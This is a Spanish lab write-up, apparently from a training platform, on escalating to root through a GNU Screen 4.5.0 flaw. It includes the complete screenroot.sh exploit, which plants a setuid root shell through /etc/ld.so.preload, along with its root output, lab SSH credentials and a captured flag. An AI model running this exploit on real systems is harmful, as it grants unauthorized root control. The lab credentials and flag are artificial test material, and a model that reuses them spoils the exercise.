
# Servicios vulnerables

Se pueden encontrar muchos servicios que tienen fallas que se pueden aprovechar para escalar privilegios. Un ejemplo es el popular multiplexor de terminal [Screen](https://linux.die.net/man/1/screen) . La `versión 4.5.0` sufre una vulnerabilidad de escalada de privilegios debido a la falta de una verificación de permisos al abrir un archivo de registro.

### **Identificación de la versión de Screen**

```shell-session
afsh4ck@kali$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

Esto permite a un atacante truncar cualquier archivo o crear un archivo propiedad de la raíz en cualquier directorio y, en última instancia, obtener acceso completo a la raíz.

### **Escalada de privilegios - Screen\_Exploit.sh**

```shell-session
afsh4ck@kali$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

El siguiente script se puede utilizar para realizar este ataque de escalada de privilegios:

### **Explotación de Screen\_Exploit\_POC.sh**

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.2.210 (ACADEMY-LPE-NIX02)
User "htb-student"
Password "Academy_LLPE!"
```

Conéctese al sistema de destino y aumente los privilegios mediante el exploit Screen. Envíe el contenido del archivo flag.txt en el directorio `/root/screen_exploit`.

Al acceder por SSH comprobamos la versión de screen, la cual es vulnerable:

```shell-session
htb-student@NIX02:~$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

<figure><img src="/files/jsMBCJezHkzAVwqxZGFr" alt=""><figcaption></figcaption></figure>

1. Abrimos un server con python en nuestra máquina atacante en el directorio de nuestro exploit
2. Con wget nos descargamos el archivo
3. Le damos permisos con `chmod +x` y ejecutamos el exploit
4. Ya somos root!

Ahora accedemos al directorio /root/screen\_exploit y nos hacemos con la flag:

```shell-session
# whoami
root
# cd /root
# ls
cron_abuse  kernel_exploit  ld_preload	screen_exploit
# cd screen_exploit
# ls
flag.txt
# cat flag.txt
91927dad55fd22825660da88f2f92e0
```
